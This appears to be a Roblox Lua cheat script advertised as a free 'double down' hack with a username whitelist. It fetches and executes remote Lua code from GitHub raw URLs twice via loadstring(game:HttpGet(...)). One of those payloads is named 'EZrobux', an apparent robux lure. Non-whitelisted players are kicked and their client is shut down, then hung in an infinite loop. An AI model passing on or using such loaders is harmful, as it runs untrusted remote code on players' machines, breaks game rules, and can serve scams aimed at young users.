--- Free double down ----
loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/ObsDuc/main/disagain.lua"))()
---- Whitelist system source ----
local whitelist = {
    Usernames = {
        "error_unknownYTk",
        "EeMe6i",
        "CuteG0D",
        "Urmyvip",
        "DEDSHOTlostsaccount",
        "Ishowspeed5538",
        "dtbwock",
        "myboyflameboy",
        "joel",
        "TRUXER68",
        "wrefwefw",
        "0100eerff",
        "manfaceASKER",
        "Addz_245",
        "Green_Playsoficial",
        "Kwk05",
        "davidcubreacroman",
        "Rafelk201",
        "team_turtle1122",
        "markitus028",
        "nikhilsinght",
        "killerboy3272",
        "Asek987",
        "SandwitchPieMan",
        "Twxpz",
        "DarkSheadow3",
        "gigabanana911",
        "naufalafif080419",
        "kanm0pmypnn0g2cg6f74",
        "bugha3q",
        "turboIine",
        "MilanGiezen",
        "lI92Il",
        "crxkn",
        "tofuu392",
        "w7asayf",
        "username",
        "Crispythekim",
        "Cheese_strings098",
        "dav5d95",
        "T_alq",
        
    },
    UserIds = {
        00000000,
        11111111,
        22222222,
    }
}

local isPassed = false
local player = game.Players.LocalPlayer

for i,v in pairs(whitelist.Usernames) do
    if player.Name == v then
        isPassed = true
    end
end

for i,v in pairs(whitelist.UserIds) do
    if player.UserId == v then
        isPassed = true
    end
end

if isPassed == false then
    player:Kick("You are not whitelisted!")
    task.wait(3)
    game:Shutdown()
    task.wait(1)
    while true do end
end

-- SCRIPT GOES HERE
loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptedClan/EZrobux/main/DoubleDownPremium.lua"))()